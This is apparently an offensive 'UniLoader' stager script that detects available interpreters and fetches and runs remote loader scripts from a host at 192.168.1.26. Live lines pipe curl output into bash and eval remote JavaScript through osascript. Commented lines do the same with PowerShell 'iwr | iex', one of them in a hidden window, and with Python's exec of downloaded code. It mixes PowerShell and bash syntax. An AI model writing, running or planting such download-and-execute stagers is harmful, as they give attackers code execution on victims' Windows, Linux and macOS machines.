
$downloadURLWindows = "http://192.168.1.26/uniloader-windows.ps1"
$downloadURLLinux   = "http://192.168.1.26/uniloader-linux.sh"
$downloadURLMac     = "http://192.168.1.26/uniloader-macos.sh"

#Write-Output "`n=== UniLoader Stager Starting ===`n"

# --- Stage 1: PowerShell (Windows / Core) ---
#(Get-Command powershell -ErrorAction SilentlyContinue) && (Write-Output "[+] PowerShell detected"; powershell -NoProfile -NonInteractive -iwr $downloadURLWindows | iex) || (Get-Command pwsh -ErrorAction SilentlyContinue) && (Write-Output "[+] PowerShell Core detected"; pwsh -NoProfile -NonInteractive -iwr $downloadURLWindows | iex) || Write-Output "[-] PowerShell not detected or not working"
#powershell -NoProfile -NonInteractive -iwr "http://192.168.1.26/uniloader-windows.ps1" | iex
#Start-Process powershell -ArgumentList '-NoProfile -NonInteractive -Command "iwr ''http://192.168.1.26/uniloader-windows.ps1'' | iex"' -NoNewWindowpowershell -NoProfile -NonInteractive -Command "iwr 'http://192.168.1.26/uniloader-windows.ps1' | iex; Read-Host 'Press Enter to exit...'"
#powershell -NoProfile -NonInteractive -Command "iwr 'http://192.168.1.26/uniloader-windows.ps1' | iex; Read-Host 'Press Enter to exit...'"
#Start-Process powershell -ArgumentList '-NoProfile -NonInteractive -Command "iwr ''http://192.168.1.26/uniloader-windows.ps1'' | iex"' -WindowStyle Hidden -RedirectStandardOutput 'C:\Temp\uniloader.log'




# ============================
# Stage 2: Bash (Linux / macOS)
# ============================

if command -v bash >/dev/null 2>&1; then
    echo "[+] Bash detected"
    bash -c "curl -fsSL $downloadURLLinux | bash"
fi

# ============================
# Stage 3: Python
# ============================
#
#if command -v python3 >/dev/null 2>&1; then
#    echo "[+] Python 3 detected"
#    python3 -c "import urllib.request; exec(urllib.request.urlopen('$downloadURLLinux').read())"
#elif command -v python >/dev/null 2>&1; then
#    echo "[+] Python 2 detected"
#    python -c "import urllib; exec(urllib.urlopen('$downloadURLLinux').read())"
#fi

# ============================
# Stage 4: macOS JXA (osascript)
# ============================

if command -v osascript >/dev/null 2>&1; then
    echo "[+] macOS JXA detected"
    osascript -l JavaScript -e "var x = $.NSURL.URLWithString('$downloadURLMac'); var s = $.NSString.stringWithContentsOfURLEncodingError(x,0,null); eval(s.js)"
fi

echo
echo "[-] No other supported interpreters detected."
